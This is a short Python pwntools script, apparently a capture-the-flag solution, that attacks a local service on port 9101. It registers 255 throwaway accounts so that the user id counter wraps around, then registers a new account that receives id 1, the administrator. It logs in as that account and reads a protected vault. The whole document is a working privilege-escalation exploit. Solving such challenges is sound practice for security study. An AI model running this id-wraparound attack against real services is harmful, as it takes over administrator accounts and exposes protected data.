from pwn import *

HOST = 'localhost'
PORT = 9101

r = remote(HOST, PORT)

for i in range(255):
    r.sendlineafter(b"> ", f"register {i} {i}".encode())
    r.recvline(0)

# id 1 -> admin
r.sendlineafter(b"> ", b"register pwn pwn")
r.recvline(0)

r.sendlineafter(b"> ", b"login pwn pwn")
r.recvline(0)

r.sendlineafter(b"> ", b"read_vault")

r.interactive()